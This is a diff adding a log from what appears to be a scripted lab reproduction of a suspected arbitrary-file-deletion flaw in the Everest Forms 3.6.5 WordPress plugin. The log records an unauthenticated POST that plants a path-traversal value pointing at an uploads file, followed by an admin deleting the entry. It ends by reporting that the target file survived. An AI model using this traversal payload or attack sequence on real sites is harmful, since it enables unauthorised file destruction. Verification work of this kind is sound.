@@ -1,0 +1,46 @@
+# Everest Forms 3.6.5, full run from an empty stack, 2026-11-24T01:36:35Z
+
+
+== starting containers
+
+== waiting for WordPress
+
+== installing WordPress
+6.8.3
+
+== installing Everest Forms 3.6.5
+3.6.5
+
+== building the form through the plugin's own ability (no manual meta-key editing)
+FORM_ID=5
+PAGE_ID=6
+FIELD Y2Pg1Ch4Ly-2 type=text label=Full Name meta-key=fullname_2
+FIELD qTpLbxYJe3-3 type=text label=Signature meta-key=signature_3 <-- matched by the delete sink
+
+== planting a victim file under uploads
+-rw-r--r-- 1 www-data www-data 11 Nov 24 01:37 /var/www/html/wp-content/uploads/2026/11/victim.png
+
+Ready. Target page: http://127.0.0.1:8100/?page_id=6
+Now run: ./exploit.sh
+
+== file on disk before
+-rw-r--r-- 1 www-data www-data 11 Nov 24 01:37 /var/www/html/wp-content/uploads/2026/11/victim.png
+
+== attacker, step 1: fetch the public page (no account, no cookie)
+HTTP 200
+
+== attacker, step 2: one unauthenticated POST, payload sprayed into every text field
+HTTP 200
+
+== the entry now holds the path under the signature_ meta key
+entry_id	meta_key	meta_value
+1	signature_3	../wp-content/uploads/2026/11/victim.png
+
+
+== administrator logs in and does ordinary housekeeping
+login HTTP 302
+trash HTTP 200
+delete permanently HTTP 200
+
+== result
+victim.png still present, the deletion did not reach it (entry 1)
